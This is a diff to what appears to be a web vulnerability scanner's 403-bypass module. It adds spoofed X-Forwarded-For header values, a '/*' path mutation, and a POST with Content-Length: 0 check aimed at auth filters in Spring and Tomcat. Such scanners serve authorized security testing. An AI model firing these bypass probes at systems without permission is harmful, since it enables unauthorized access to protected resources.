@@ -32,6 +32,8 @@ BYPASS_HEADERS_IP = [
     ("X-Http-Destinationurl", "127.0.0.1"),
     ("X-Custom-IP-Authorization", "127.0.0.1"),
     ("X-Forwarded-For-Original", "127.0.0.1"),
+    ("X-Forwarded-For", "http://127.0.0.1"),
+    ("X-Forwarded-For", "127.0.0.1:80"),
     ("Client-IP", "127.0.0.1"),
     ("Real-Ip", "127.0.0.1"),
     ("Proxy-Host", "127.0.0.1"),
@@ -60,6 +62,7 @@ PATH_MUTATIONS = [
     "{path}/", "{path}//", "{path}/.", "{path}/..",
     "{path}..;/", "{path};/", "{path}%20", "{path}%09",
     "{path}%00", "{path}?", "{path}#", "{path}?;",
+    "{path}/*",
     # Prefix mutations
     "/{path}", "//{path}", "/./{path}", "/.;/{path}",
     # Path traversal tricks
@@ -230,6 +233,25 @@ def _test_method_bypass(url, delay=0):
                 return findings
         except ScanExceptions:
             pass
+
+    # POST + Content-Length: 0 — bypasses some auth filters (Spring, Tomcat)
+    try:
+        resp = smart_request(
+            "post", url, delay=delay, timeout=5,
+            headers={"Content-Length": "0"},
+        )
+        if resp.status_code == 200:
+            findings.append({
+                "type": "403 Bypass",
+                "vuln": "Method Switch",
+                "payload": "POST + Content-Length: 0",
+                "severity": "HIGH",
+                "description": "Access bypass via POST with Content-Length: 0",
+                "url": url,
+            })
+            log_success("🔓 403 bypass! POST + Content-Length: 0")
+    except ScanExceptions:
+        pass
 
     return findings
 
